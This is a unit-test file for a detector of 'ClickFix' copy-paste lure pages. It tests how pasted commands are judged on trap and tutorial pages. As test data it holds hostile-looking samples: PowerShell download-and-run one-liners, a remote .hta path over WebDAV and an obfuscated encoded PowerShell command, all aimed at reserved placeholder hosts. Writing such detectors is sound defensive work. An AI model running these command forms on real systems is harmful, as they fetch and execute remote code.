// Unit tests for the detection engine. Run with: npm test
// All "malicious" samples point at reserved, non-routable names and addresses
// (example.invalid, *.example, 203.0.113.0/24) so nothing here can download anything.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { createDetector, defang } = require('../engine/detector.js');
const rules = require('../rules/clickfix-rules.json');
const d = createDetector(rules);

// Shared with the PowerShell checker tests, so both engines must agree.
const fixtures = require('./fixtures/commands.json');

const LURE_PAGE = `Verify you are human. Complete these verification steps:
1. Press Windows Button + R
2. Press CTRL + V
3. Press Enter`;

const TUTORIAL_PAGE = 'To open the Registry Editor, press Windows + R, type regedit and press Enter.';
const PASTE_TUTORIAL = 'Open PowerShell: press Win + R, type powershell, press Enter. Then paste the command below.';
const INSTALLER = 'irm https://get.scoop.sh | iex';

for (const [expected, set] of [['block', fixtures.block], ['allow', fixtures.allow], ['hold', fixtures.hold]]) {
  for (const [name, cmd] of Object.entries(set)) {
    test(`${expected}: ${name}`, () => {
      const r = d.check(cmd, '');
      assert.equal(r.verdict, expected, `expected ${expected}, got ${r.verdict}; reasons=${JSON.stringify(r.reasons)}`);
      if (expected !== 'allow') assert.ok(r.reasons.length > 0, 'a block or hold must explain itself');
    });
  }
}

test('on a real trap page, any command or web address is blocked', () => {
  assert.equal(d.check(INSTALLER, LURE_PAGE).verdict, 'block');
  assert.equal(d.check('cmd /c echo hello', LURE_PAGE).verdict, 'block');
  assert.equal(d.check('\\\\203.0.113.5@SSL\\DavWWWRoot\\verify.hta', LURE_PAGE).verdict, 'block');
});

test('normal text is never blocked, even on a trap page', () => {
  assert.equal(d.check('Hello, here is my email address', LURE_PAGE).verdict, 'allow');
});

test('a "Win+R, paste" tutorial only pauses installers, never blocks (review B1)', () => {
  const r = d.check(INSTALLER, PASTE_TUTORIAL);
  assert.equal(r.verdict, 'hold');
  assert.match(r.reasons[0], /Win\+R/);
  assert.equal(d.check('cmd /c echo hello', PASTE_TUTORIAL).verdict, 'allow');
});

test('page analysis: trap vs tutorial', () => {
  const lure = d.analyzePage(LURE_PAGE);
  assert.ok(lure.weak && lure.strong, 'trap page should be strong');
  assert.ok(!d.analyzePage(TUTORIAL_PAGE).weak, 'a Win+R tutorial without "paste" is not a trap');
  const tut = d.analyzePage(PASTE_TUTORIAL);
  assert.ok(tut.weak && !tut.strong, 'a paste tutorial is weak, not strong');
});

test('page analysis: FileFix and Mac Terminal traps', () => {
  assert.ok(d.analyzePage('To open the shared HR file: copy the path, open File Explorer, click the address bar and paste it (Ctrl + V). Verification required.').strong);
  assert.ok(d.analyzePage('Human verification: press Cmd + Space, open Terminal, then press Cmd + V and Return.').strong);
});

test('page analysis: other ways of writing Win+R and Ctrl+V (review A1)', () => {
  for (const t of [
    'Press Win+R then press Ctrl+V',
    'Press ⊞ + R then press Ctrl+V',
    'press Windows Key + "R" then press Ctrl+V',
    'Press the Windows logo key and the R key, then press Ctrl and V',
    'Hold the [WIN] key and tap [R]. Then hold [CTRL] and tap [V]',
    'Drücken Sie Windows-Taste + R und dann Strg + V'
  ]) {
    assert.ok(d.analyzePage(t).weak, t);
  }
  assert.ok(d.analyzePage('Verificación: presione Windows + R y luego Ctrl + V').strong, 'Spanish trap');
  assert.ok(!d.analyzePage('Windows and recent updates. Paste your feedback here.').weak, 'no Win+R here');
});

test('padding with comment lines does not soften a block, real long scripts are paused', () => {
  const script = Array.from({ length: 10 }, (_, i) => `Write-Host step ${i}`).join('\n') +
    '\npowershell -w hidden -c "iwr https://example.invalid/tool.ps1 | iex"';
  assert.equal(d.check(script, '').verdict, 'hold');
});

test('a download-and-run command copied inside a frame is paused, with the reason', () => {
  const plain = 'powershell -c "irm https://example.invalid/x | iex"';
  const r = d.check(plain, '', { subframe: true });
  assert.equal(r.verdict, 'hold');
  assert.match(r.reasons.join(' '), /frame/);
  assert.equal(d.check('npm install react', '', { subframe: true }).verdict, 'allow');
});

test('defang breaks links for display', () => {
  assert.equal(defang('get https://evil.example/x'), 'get hxxps[://]evil.example/x');
});

test('engine resists a page that tampers with built-ins after load (review A4)', () => {
  const trap = fixtures.block['mshta with fake Cloudflare comment'];
  const savedExec = RegExp.prototype.exec;
  try {
    RegExp.prototype.exec = () => null;
    Object.defineProperty(Array.prototype, '0', { set() {}, get() { return undefined; }, configurable: true });
    Object.defineProperty(Object.prototype, 'verdict', { get() { return 'allow'; }, configurable: true });
    Object.defineProperty(Object.prototype, 'lastIndex', { set() {}, configurable: true });
    const r = d.check(trap, '');
    assert.equal(r.verdict, 'block');
    assert.ok(r.reasons.length > 0);
  } finally {
    RegExp.prototype.exec = savedExec;
    delete Array.prototype[0];
    delete Object.prototype.verdict;
    delete Object.prototype.lastIndex;
  }
});

test('disguise removal still works when a page breaks String.replace (found while fixing A4)', () => {
  const sample = 'c^m^d /c p^o^w^e^r^s^h^e^l^l -w 1 -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUA';
  const savedReplace = RegExp.prototype[Symbol.replace];
  const savedExec = RegExp.prototype.exec;
  try {
    RegExp.prototype[Symbol.replace] = function (str) { return String(str); };
    RegExp.prototype.exec = () => null;
    assert.equal(d.check(sample, '').verdict, 'block');
  } finally {
    RegExp.prototype[Symbol.replace] = savedReplace;
    RegExp.prototype.exec = savedExec;
  }
});
